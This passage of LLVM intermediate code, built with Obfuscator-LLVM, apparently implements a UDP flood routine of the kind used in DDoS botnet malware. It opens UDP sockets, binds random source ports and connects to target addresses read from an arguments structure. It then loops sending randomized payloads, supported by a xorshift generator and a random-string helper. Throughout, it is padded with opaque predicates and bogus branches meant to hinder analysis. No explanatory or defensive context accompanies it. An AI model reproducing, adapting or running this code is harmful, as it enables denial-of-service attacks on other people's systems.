  %255 = trunc i32 %254 to i8
  %256 = load i8*, i8** %6, align 8
  %257 = load i32, i32* %12, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8, i8* %256, i64 %258
  store i8 %255, i8* %259, align 1
  br label %260

; <label>:260:                                    ; preds = %252
  %261 = load i32, i32* %12, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %12, align 4
  br label %231

; <label>:263:                                    ; preds = %originalBBpart240
  %264 = load i32*, i32** %7, align 8
  %265 = load i32, i32* %5, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i32, i32* %264, i64 %266
  %268 = load i32, i32* %267, align 4
  %269 = load i8*, i8** %6, align 8
  %270 = load i16, i16* %3, align 2
  %271 = zext i16 %270 to i64
  %272 = call i64 @send(i32 %268, i8* %269, i64 %271, i32 16384)
  br label %273

; <label>:273:                                    ; preds = %263
  %274 = load i32, i32* %5, align 4
  %275 = add nsw i32 %274, 1
  store i32 %275, i32* %5, align 4
  br label %216

; <label>:276:                                    ; preds = %216
  %277 = load i32, i32* @x.31
  %278 = load i32, i32* @y.32
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %276
  %285 = load i32, i32* @x.31
  %286 = load i32, i32* @y.32
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %215
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  call void @exit(i32 1) #10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %294 = load %struct.arguments*, %struct.arguments** %2, align 8
  %295 = getelementptr inbounds %struct.arguments, %struct.arguments* %294, i32 0, i32 1
  %296 = load %struct.option*, %struct.option** %295, align 8
  %297 = load %struct.arguments*, %struct.arguments** %2, align 8
  %298 = getelementptr inbounds %struct.arguments, %struct.arguments* %297, i32 0, i32 2
  %299 = load i8, i8* %298, align 8
  %300 = call i32 @rand() #8
  %_ = sub i32 %300, 65482
  %gen = mul i32 %_, 65482
  %_2 = sub i32 %300, 65482
  %gen3 = mul i32 %_2, 65482
  %_4 = sub i32 0, %300
  %gen5 = add i32 %_4, 65482
  %301 = srem i32 %300, 65482
  %_6 = sub i32 53, %301
  %gen7 = mul i32 %_6, %301
  %_8 = sub i32 0, 53
  %gen9 = add i32 %_8, %301
  %_10 = sub i32 53, %301
  %gen11 = mul i32 %_10, %301
  %_12 = sub i32 0, 53
  %gen13 = add i32 %_12, %301
  %302 = add nsw i32 53, %301
  %303 = trunc i32 %302 to i16
  %304 = call zeroext i16 @retrieve_opt_num(%struct.option* %296, i8 zeroext %299, i8 zeroext 1, i16 zeroext %303)
  store i16 %304, i16* %4, align 2
  %305 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %306 = load i32*, i32** %7, align 8
  %307 = load i32, i32* %5, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i32, i32* %306, i64 %308
  store i32 %305, i32* %309, align 4
  %310 = load i32*, i32** %7, align 8
  %311 = load i32, i32* %5, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds i32, i32* %310, i64 %312
  %314 = load i32, i32* %313, align 4
  %315 = icmp eq i32 %314, -1
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %86
  %316 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %316, align 4
  %317 = call i32 @rand_new()
  %318 = trunc i32 %317 to i16
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %318, i16* %319, align 2
  %320 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %321 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %320, i32 0, i32 0
  store i32 0, i32* %321, align 4
  %322 = load i32*, i32** %7, align 8
  %323 = load i32, i32* %5, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds i32, i32* %322, i64 %324
  %326 = load i32, i32* %325, align 4
  %327 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %328 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %328, %struct.sockaddr** %327, align 8
  %329 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %330 = load %struct.sockaddr*, %struct.sockaddr** %329, align 8
  %331 = call i32 @bind(i32 %326, %struct.sockaddr* %330, i32 16) #8
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %332, align 4
  %333 = load i16, i16* %4, align 2
  %334 = call zeroext i16 @htons(i16 zeroext %333) #9
  %335 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %334, i16* %335, align 2
  %336 = load %struct.arguments*, %struct.arguments** %2, align 8
  %337 = getelementptr inbounds %struct.arguments, %struct.arguments* %336, i32 0, i32 0
  %338 = load %struct.target*, %struct.target** %337, align 8
  %339 = load i32, i32* %5, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.target, %struct.target* %338, i64 %340
  %342 = getelementptr inbounds %struct.target, %struct.target* %341, i32 0, i32 1
  %343 = load i16, i16* %342, align 4
  %344 = zext i16 %343 to i32
  %345 = icmp slt i32 %344, 32
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %165
  %346 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %347 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %346, i32 0, i32 0
  store i32 %166, i32* %347, align 4
  %348 = load i32*, i32** %7, align 8
  %349 = load i32, i32* %5, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds i32, i32* %348, i64 %350
  %352 = load i32, i32* %351, align 4
  %353 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %354 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %354, %struct.sockaddr** %353, align 8
  %355 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %356 = load %struct.sockaddr*, %struct.sockaddr** %355, align 8
  %357 = call i32 @connect(i32 %352, %struct.sockaddr* %356, i32 16)
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %195
  %358 = load i32, i32* %5, align 4
  %_26 = shl i32 %358, 1
  %_27 = shl i32 %358, 1
  %_28 = sub i32 %358, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %358
  %gen31 = add i32 %_30, 1
  %_32 = shl i32 %358, 1
  %_33 = sub i32 %358, 1
  %gen34 = mul i32 %_33, 1
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %5, align 4
  br label %originalBB25

originalBB38alteredBB:                            ; preds = %originalBB38, %231
  %360 = load i32, i32* %12, align 4
  %361 = load i16, i16* %3, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp slt i32 %360, %362
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %276
  br label %originalBB42
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_new() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @t, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 15
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 9
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @p, align 4
  store i32 %11, i32* @t, align 4
  %12 = load i32, i32* @c, align 4
  store i32 %12, i32* @p, align 4
  %13 = load i32, i32* @f, align 4
  store i32 %13, i32* @c, align 4
  %14 = load i32, i32* @f, align 4
  %15 = lshr i32 %14, 13
  %16 = load i32, i32* @f, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @f, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @f, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @f, align 4
  %21 = load i32, i32* @f, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_string(i8*, i32) #0 {
  %3 = load i32, i32* @x.35
  %4 = load i32, i32* @y.36
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i8 0, i8* %15, align 1
  store i32 0, i32* %13, align 4
  %16 = load i32, i32* @x.35
  %17 = load i32, i32* @y.36
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %originalBBpart220, %originalBBpart2
  %25 = load i32, i32* %13, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %78

; <label>:28:                                     ; preds = %24
  %29 = load i32, i32* @x.35
  %30 = load i32, i32* @y.36
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = call i32 @rand_new()
  store i32 %37, i32* %14, align 4
  %38 = load i32, i32* %14, align 4
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %15, align 1
  %41 = load i8, i8* %15, align 1
  %42 = zext i8 %41 to i32
  %43 = ashr i32 %42, 3
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %15, align 1
  %45 = load i8, i8* %15, align 1
  %46 = zext i8 %45 to i64
  %47 = getelementptr inbounds [36 x i8], [36 x i8]* @alpha_set, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = load i8*, i8** %11, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %11, align 8
  store i8 %48, i8* %49, align 1
  %51 = load i32, i32* @x.35
  %52 = load i32, i32* @y.36
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br label %59

; <label>:59:                                     ; preds = %originalBBpart214
  %60 = load i32, i32* @x.35
  %61 = load i32, i32* @y.36
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %59
  %68 = load i32, i32* %13, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %13, align 4
  %70 = load i32, i32* @x.35
  %71 = load i32, i32* @y.36
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart220, label %originalBB16alteredBB

originalBBpart220:                                ; preds = %originalBB16
  br label %24

; <label>:78:                                     ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %79 = alloca i8*, align 8
  %80 = alloca i32, align 4
  %81 = alloca i32, align 4
  %82 = alloca i32, align 4
  %83 = alloca i8, align 1
  store i8* %0, i8** %79, align 8
  store i32 %1, i32* %80, align 4
  store i32 0, i32* %81, align 4
  store i32 0, i32* %82, align 4
  store i8 0, i8* %83, align 1
  store i32 0, i32* %81, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %84 = call i32 @rand_new()
  store i32 %84, i32* %14, align 4
  %85 = load i32, i32* %14, align 4
  %_ = sub i32 %85, 255
  %gen = mul i32 %_, 255
  %_2 = shl i32 %85, 255
  %_3 = shl i32 %85, 255
  %_4 = shl i32 %85, 255
  %_5 = sub i32 %85, 255
  %gen6 = mul i32 %_5, 255
  %_7 = sub i32 %85, 255
  %gen8 = mul i32 %_7, 255
  %86 = and i32 %85, 255
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %15, align 1
  %88 = load i8, i8* %15, align 1
  %89 = zext i8 %88 to i32
  %_9 = sub i32 %89, 3
  %gen10 = mul i32 %_9, 3
  %_11 = sub i32 %89, 3
  %gen12 = mul i32 %_11, 3
  %90 = ashr i32 %89, 3
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %15, align 1
  %92 = load i8, i8* %15, align 1
  %93 = zext i8 %92 to i64
  %94 = getelementptr inbounds [36 x i8], [36 x i8]* @alpha_set, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = load i8*, i8** %11, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %11, align 8
  store i8 %95, i8* %96, align 1
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %59
  %98 = load i32, i32* %13, align 4
  %_17 = sub i32 %98, 1
  %gen18 = mul i32 %_17, 1
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %13, align 4
  br label %originalBB16
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind readonly }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
